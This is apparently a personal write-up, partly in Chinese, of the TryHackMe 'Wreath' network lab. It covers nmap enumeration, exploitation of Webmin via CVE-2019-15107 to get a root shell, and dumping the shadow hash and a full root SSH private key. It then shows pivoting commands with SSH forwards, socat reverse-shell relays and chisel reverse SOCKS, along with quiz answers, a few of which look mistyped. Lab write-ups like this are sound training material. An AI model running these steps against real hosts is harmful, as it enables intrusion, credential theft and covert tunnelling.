# Task 5  Webserver Enumeration

```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# nmap -p-15000 -vv 10.200.101.200 -oG initial-scan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 03:17 EDT
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2022-08-22 03:17:30 EDT for 261s
Not shown: 14773 filtered tcp ports (no-response), 220 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack ttl 63
80/tcp    open   http             syn-ack ttl 63
443/tcp   open   https            syn-ack ttl 63
6666/tcp  closed irc              reset ttl 63
9090/tcp  closed zeus-admin       reset ttl 63
9999/tcp  open   abyss            syn-ack ttl 63
10000/tcp open   snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 274.30 seconds
           Raw packets sent: 44868 (1.974MB) | Rcvd: 265 (17.652KB)

```


详细
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# nmap -sV -Pn -A -O 10.200.101.200 -p 22,80,443,9999,10000     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 03:29 EDT
Nmap scan report for thomaswreath.thm (10.200.101.200)
Host is up (0.24s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open  http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open  ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2022-08-22T02:10:16
|_Not valid after:  2023-08-22T02:10:16
9999/tcp  open  tcpwrapped
10000/tcp open  http       MiniServ 1.890 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   235.66 ms 10.50.102.1
2   235.80 ms thomaswreath.thm (10.200.101.200)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.34 seconds

```

> How many of the first 15000 ports are open on the target?

> 4

(明明扫出来是5个，不知道答案为什么是4个)

> What OS does Nmap think is running?

> centos

> Open the IP in your browser -- what site does the server try to redirect you to?

> https://thomaswreath.thm/

> Read through the text on the page. What is Thomas' mobile phone number?

> 447821548812 

> Look back at your service scan results: what server version does Nmap detect as running here?

> MiniServ 1.890 (Webmin httpd)

> What is the CVE number for this exploit?

> CVE-2019-15107

# Task 6  Webserver Exploitation

拿到初始shell

```
┌──(root💀kali)-[~/tryhackme/Wreath/CVE-2019-15107]
└─# chmod +x ./CVE-2019-15107.py
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Wreath/CVE-2019-15107]
└─# ./CVE-2019-15107.py 10.200.101.200

        __        __   _               _         ____   ____ _____                                                                                                                                                                          
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                                                                                                                                         
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                                                                                                                                           
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                                                                                                                                                          
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                @MuirlandOracle                                                                                                                                                                             
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.101.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                                                                                                                                                                                          
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

```

哈希
```
# cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:9
```

ssh 秘钥
```
# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
#
```

登录
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# chmod 600 id_rsa                                                                                          255 ⨯
                                                                                                                    
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# ssh -i id_rsa root@10.200.101.200
[root@prod-serv ~]# id
uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@prod-serv ~]# whoami
root
```

> Which user was the server running as?

> root

> What is the root user's password hash?

> $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::

> What is the full path to this file?

> /root/.ssh/id_rsa

# Task 8  Pivoting High-level Overview

> Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?

> Tunnelling

> Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?

> portfwd 

# Task 9  Pivoting Enumeration

> What is the absolute path to the file containing DNS entries on Linux?

> /etc/resolv.conf

> What is the absolute path to the hosts file on Windows?

> C:\Windows\System32\drivers\etc\hosts

> How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

> for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

# Task 10  Pivoting Proxychains & Foxyproxy

> What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?

> socks4 127.0.0.1 4242

> What command would you use to telnet through a proxy to 172.16.0.100:23?

> proxychains telnet 172.16.0.100 23

> You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?

> fp

# Task 11  Pivoting SSH Tunnelling / Port Forwarding

> If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

> l

> Which switch combination can be used to background an SSH port forward or tunnel?

> -fN

> It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

> nay

> What command would you use to create a pair of throwaway SSH keys for a reverse connection?

> ssh-keygen

> If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

> ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN

> What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

> ssh -D 8000  user@target.thm -fN

> If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

> ssh -r 8000:127.0.0.1:80 user@172.16.0.50 -fN

# Task 12  Pivoting plink.exe

> What tool can be used to convert OpenSSH keys into PuTTY style keys?

> puttygen

# Task 13  Pivoting Socat

> Which socat option allows you to reuse the same listening port for more than one connection?

> reuseaddr 

> If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

> ./socat tcp-l:8000 tcp:172.16.0.200:443

> What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?

> ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &

# Task 14  Pivoting Chisel

> What command would you use to start a chisel server for a reverse connection on your attacking machine?

> ./chisel server -p 4242 --reverse

> What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?

> ./chisel client 172.16.0.200:4242 R:socks &

> How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.

> ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

> If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?

> ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80s

# Task 15  Pivoting sshuttle

> How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

> sshuttle -r pwned@172.16.20.7 172.16.0.0/16

> What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

> --ssh-cmd "ssh -i priv_key"

> You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.

> -x  172.16.0.100

# Task 17  Git Server Enumeration

nmap扫描内网存活主机。-sn表示只扫描主机，不扫描端口
```
[root@prod-serv ~]# ./nmap -sn 10.200.101.1-255 -oN scan-max

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:41 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-101-1.eu-west-1.compute.internal (10.200.101.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00045s latency).
MAC Address: 02:23:3F:A3:95:4B (Unknown)
Nmap scan report for ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100)
Host is up (0.00019s latency).
MAC Address: 02:50:72:C7:62:41 (Unknown)
Nmap scan report for ip-10-200-101-150.eu-west-1.compute.internal (10.200.101.150)
Host is up (-0.10s latency).
MAC Address: 02:2B:51:EC:71:61 (Unknown)
Nmap scan report for ip-10-200-101-250.eu-west-1.compute.internal (10.200.101.250)
Host is up (0.00047s latency).
MAC Address: 02:CC:C0:0D:98:63 (Unknown)
Nmap scan report for ip-10-200-101-200.eu-west-1.compute.internal (10.200.101.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.74 seconds

```

10.200.101.1是网关
10.200.101.250是ovpn服务器
10.200.101.200是linux靶机自己

因此，我们的目标是
```
10.200.101.100
10.200.101.150
```

扫描100，全端口都被过滤
```
[root@prod-serv ~]# ./nmap 10.200.101.100

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:45 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00014s latency).
All 6150 scanned ports on ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100) are filtered
MAC Address: 02:50:72:C7:62:41 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 124.52 seconds
```

150有返回
```
[root@prod-serv ~]# ./nmap 10.200.101.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:48 BST
Scanned at 2022-08-22 13:48:13 BST for 207s
Not shown: 6143 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8888/tcp open  ddi-tcp-1

```


扫描前15000个端口
```
[root@prod-serv ~]# ./nmap -p-15000 -vv 10.200.101.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:53 BST
Discovered open port 5985/tcp on 10.200.101.150
Completed SYN Stealth Scan at 13:58, 309.14s elapsed (15000 total ports)
Nmap scan report for ip-10-200-101-150.eu-west-1.compute.internal (10.200.101.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up, received arp-response (0.0082s latency).
Scanned at 2022-08-22 13:53:08 BST for 309s
Not shown: 14993 filtered ports
Reason: 14993 no-responses
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
135/tcp  open  epmap         syn-ack ttl 128
139/tcp  open  netbios-ssn   syn-ack ttl 128
445/tcp  open  microsoft-ds  syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
5985/tcp open  wsman         syn-ack ttl 128
8888/tcp open  ddi-tcp-1     syn-ack ttl 128

```

> Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?

> 2

> In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)

> 100,150

> Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?

> 150

> Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?

> 80,3389,5985

> Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

> http

